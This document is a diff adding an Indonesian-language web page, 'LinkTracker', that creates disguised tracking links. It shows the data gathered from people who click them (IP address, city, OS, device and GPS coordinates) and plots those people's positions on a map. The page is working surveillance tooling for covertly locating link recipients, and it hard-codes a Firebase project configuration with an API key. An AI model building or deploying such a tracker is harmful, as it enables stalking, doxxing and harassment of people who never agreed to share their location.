@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkTracker</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        .container { border: 1px solid #ddd; padding: 20px; margin-bottom: 20px; border-radius: 8px; }
+        input, button { padding: 10px; margin: 5px 0; width: 100%; box-sizing: border-box; }
+        button { background: #3498db; color: white; border: none; cursor: pointer; }
+        .link-result { background: #f8f9fa; padding: 15px; margin: 10px 0; border-radius: 4px; }
+        .location-data { background: #e8f4fc; padding: 15px; margin: 10px 0; border-radius: 4px; }
+        .warning { background: #ffebee; padding: 15px; border-left: 4px solid #f44336; margin: 15px 0; }
+        .location-data p { font-size: 12px; margin: 2px 0; color: #333; }
+        .location-data h3 { font-size: 14px; margin-top: 8px; margin-bottom: 4px; color: #0066cc; }
+        #map { height: 400px; margin-top: 20px; display: none; }
+    </style>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+</head>
+<body>
+    <h2>LinkTracker - Pembuat Tautan Pelacak</h2>
+    
+    <div class="container">
+        <h3>Buat Tautan Pelacak Baru</h3>
+        <input type="text" id="targetUrl" placeholder="https://example.com">
+        <button onclick="generateLink()">Buat Tautan Pelacak</button>
+        
+        <div id="generatedLink" class="link-result" style="display: none;">
+            <h3>Tautan Pelacak Anda:</h3>
+            <a id="trackableLink" target="_blank"></a>
+        </div>
+    </div>
+    
+    <div class="container">
+        <h3>Data Lokasi yang Dikumpulkan</h3>
+        <div id="locationData" class="location-data">
+            <p>Belum ada data lokasi yang dikumpulkan.</p>
+        </div>
+    </div>
+
+    <div id="map"></div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getFirestore, doc, setDoc, getDocs, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+        // Ganti dengan config Firebase project kamu
+        const firebaseConfig = {
+            apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
+            authDomain: "locked-1dfad.firebaseapp.com",
+            projectId: "locked-1dfad",
+            storageBucket: "locked-1dfad.firebasestorage.app",
+            messagingSenderId: "237366240355",
+            appId: "1:237366240355:web:e3a4f999ff547a07398456"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        async function generateLink() {
+            const targetUrl = document.getElementById('targetUrl').value;
+            if (!targetUrl) return alert('Masukkan URL tujuan');
+            
+            const linkId = 'link_' + Date.now();
+            await setDoc(doc(db, "trackingLinks", linkId), {
+                targetUrl,
+                clicks: []
+            });
+
+            const trackableLink = window.location.href.replace(/[^/]*$/, '') + 'track.html?id=' + linkId;
+            document.getElementById('trackableLink').href = trackableLink;
+            document.getElementById('trackableLink').textContent = trackableLink;
+            document.getElementById('generatedLink').style.display = 'block';
+        }
+        
+        async function updateLocationData() {
+            const locationDataDiv = document.getElementById('locationData');
+            locationDataDiv.innerHTML = '';
+            const mapDiv = document.getElementById('map');
+            let hasLocation = false;
+            let allCoords = [];
+
+            const querySnapshot = await getDocs(collection(db, "trackingLinks"));
+            if (querySnapshot.empty) {
+                locationDataDiv.innerHTML = '<p>Belum ada data lokasi yang dikumpulkan.</p>';
+                return;
+            }
+
+            querySnapshot.forEach(docSnap => {
+                const link = docSnap.data();
+                if (link.clicks && link.clicks.length > 0) {
+                    const linkHeader = document.createElement('h3');
+                    linkHeader.textContent = `Tautan: ${link.targetUrl}`;
+                    locationDataDiv.appendChild(linkHeader);
+
+                    link.clicks.forEach(click => {
+                        const clickInfo = document.createElement('p');
+                        let infoText = `- Waktu: ${new Date(click.timestamp).toLocaleString()}`;
+                        if (click.os) infoText += `\n- OS: ${click.os}`;
+                        if (click.device) infoText += `\n- Device: ${click.device}`;
+                        if (click.ipInfo) infoText += `\n- IP: ${click.ipInfo.ip} (${click.ipInfo.city}, ${click.ipInfo.country})`;
+                        if (click.location) {
+                            infoText += `\n- Lokasi: ${click.location.latitude}, ${click.location.longitude}`;
+                            hasLocation = true;
+                            allCoords.push([click.location.latitude, click.location.longitude]);
+                        } else {
+                            infoText += '\n- Lokasi: Tidak Diizinkan';
+                        }
+                        clickInfo.style.whiteSpace = "pre";
+                        clickInfo.textContent = infoText;
+                        locationDataDiv.appendChild(clickInfo);
+                    });
+                }
+            });
+
+            if (hasLocation) {
+                mapDiv.style.display = "block";
+                const map = L.map('map').setView(allCoords[allCoords.length - 1], 13);
+
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '© OpenStreetMap'
+                }).addTo(map);
+
+                // garis polyline merah
+                const polyline = L.polyline(allCoords, { color: 'red' }).addTo(map);
+                map.fitBounds(polyline.getBounds());
+
+                // titik marker merah
+                allCoords.forEach((coord, i) => {
+                    L.marker(coord, {
+                        icon: L.icon({
+                            iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-red.png',
+                            shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/images/marker-shadow.png',
+                            iconSize: [25, 41],
+                            iconAnchor: [12, 41],
+                            popupAnchor: [1, -34],
+                            shadowSize: [41, 41]
+                        })
+                    }).addTo(map)
+                    .bindPopup(`Posisi ke-${i+1}`);
+                });
+            }
+        }
+
+        window.onload = updateLocationData;
+    </script>
+</body>
+</html>
